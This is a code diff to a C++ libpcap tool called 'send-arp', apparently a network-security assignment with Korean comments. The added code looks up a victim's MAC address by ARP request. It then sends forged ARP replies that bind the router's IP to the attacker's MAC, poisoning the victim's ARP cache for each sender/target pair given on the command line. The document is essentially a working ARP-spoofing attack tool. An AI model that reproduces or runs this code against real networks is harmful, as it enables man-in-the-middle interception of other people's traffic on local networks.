@@ -17,7 +17,7 @@ struct EthArpPacket final {
 
 void usage() {
 	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
-	printf("sample : send-arp enp6s0 192.168.200.141 192.168.200.254\n");
+	printf("sample : send-arp enp6s0 192.168.200.163 192.168.200.254\n");
 }
 
 struct Param {
@@ -76,13 +76,60 @@ Ip getMyIp(const char* dev) {
 	return Ip(ntohl(sin->sin_addr.s_addr));
 }
 
+Mac getVictimMac(pcap_t* pcap, Mac attackerMac, Ip attackerIp, Ip senderIp) {
+	EthArpPacket packet;
+
+	// arp request 브로드캐스트 하기
+	packet.eth_.dmac_ = Mac::broadcastMac();
+	packet.eth_.smac_ = attackerMac;
+	packet.eth_.type_ = htons(EthHdr::Arp);
+
+	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+	packet.arp_.pro_ = htons(EthHdr::Ip4);
+	packet.arp_.hln_ = Mac::Size;
+	packet.arp_.pln_ = Ip::Size;
+	packet.arp_.op_ = htons(ArpHdr::Request);
+	packet.arp_.smac_ = attackerMac;
+	packet.arp_.sip_ = htonl(attackerIp);
+	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
+	packet.arp_.tip_ = htonl(senderIp);
+
+	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+	if (res != 0) {
+		fprintf(stderr, "pcap_sendpacket failed: %s\n", pcap_geterr(pcap));
+		return Mac::nullMac(); // 실패 시 nullMac 반환
+	}
+
+	// arp reply 기다리기
+	while (true) {
+		struct pcap_pkthdr* response_header;
+		const u_char* response_pkt;
+		int ret = pcap_next_ex(pcap, &response_header, &response_pkt);
+		if (ret == 0) continue;
+		if (ret == PCAP_ERROR || ret == PCAP_ERROR_BREAK) {
+			fprintf(stderr, "pcap_next_ex error: %s\n", pcap_geterr(pcap));
+			return Mac::nullMac(); // 실패 시 nullMac 반환
+		}
+
+		EthHdr* ethHdr = (EthHdr*)response_pkt;
+		if (ethHdr->type() != EthHdr::Arp) continue;
+
+		ArpHdr* arpHdr = (ArpHdr*)(response_pkt + sizeof(EthHdr));
+		if (arpHdr->op() != ArpHdr::Reply) continue;
+		if (arpHdr->sip() != senderIp) continue;
+
+		return arpHdr->smac();
+	}
+}
+
+
 int main(int argc, char* argv[]) {
 	if (!parse(&param, argc, argv))
 		return EXIT_FAILURE;
 
 	char* dev = param.dev_;
 	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* pcap = pcap_open_live(dev, 0, 0, 0, errbuf);
+	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
 	if (pcap == nullptr) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
 		return EXIT_FAILURE;
@@ -93,28 +140,38 @@ int main(int argc, char* argv[]) {
 	// 2. Attacker IP 주소 휙득
 	Ip attackerIp = getMyIp(dev);
 
-	printf("MAC: %s\n", std::string(attackerMac).c_str());
-	printf("IP : %s\n", std::string(attackerIp).c_str());
+	printf("Attacker MAC: %s\n", std::string(attackerMac).c_str());
+	printf("Attacker IP: %s\n", std::string(attackerIp).c_str());
 
-	EthArpPacket packet;
+	for (int i = 0; i < param.pairs_.size(); i++) {
+		Ip senderIp = param.pairs_[i].first;
+		Ip targetIp = param.pairs_[i].second;
 
-	packet.eth_.dmac_ = Mac("00:00:00:00:00:00");
-	packet.eth_.smac_ = Mac("00:00:00:00:00:00");
-	packet.eth_.type_ = htons(EthHdr::Arp);
+		// 3. Victim MAC 주소 휙득
+		Mac victimMac = getVictimMac(pcap, attackerMac, attackerIp, senderIp);
+		printf("Victim MAC: %s\n", std::string(victimMac).c_str());
 
-	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-	packet.arp_.pro_ = htons(EthHdr::Ip4);
-	packet.arp_.hln_ = Mac::Size;
-	packet.arp_.pln_ = Ip::Size;
-	packet.arp_.op_ = htons(ArpHdr::Request);
-	packet.arp_.smac_ = Mac("00:00:00:00:00:00");
-	packet.arp_.sip_ = htonl(Ip("0.0.0.0"));
-	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
-	packet.arp_.tip_ = htonl(Ip("0.0.0.0"));
+		// 4. Victim에게 ARP Infection 패킷 전송
+		EthArpPacket packet;
 
-	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+		packet.eth_.dmac_ = victimMac;
+		packet.eth_.smac_ = attackerMac;
+		packet.eth_.type_ = htons(EthHdr::Arp);
+
+		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+		packet.arp_.pro_ = htons(EthHdr::Ip4);
+		packet.arp_.hln_ = Mac::Size;
+		packet.arp_.pln_ = Ip::Size;
+		packet.arp_.op_ = htons(ArpHdr::Reply);
+		packet.arp_.smac_ = attackerMac; // smac은 공격자 MAC 주소
+		packet.arp_.sip_ = htonl(targetIp); // sip은 라우터 IP 주소 
+		packet.arp_.tmac_ = victimMac;
+		packet.arp_.tip_ = htonl(senderIp);
+
+		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+		if (res != 0) {
+			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+		}
 	}
 
 	pcap_close(pcap);
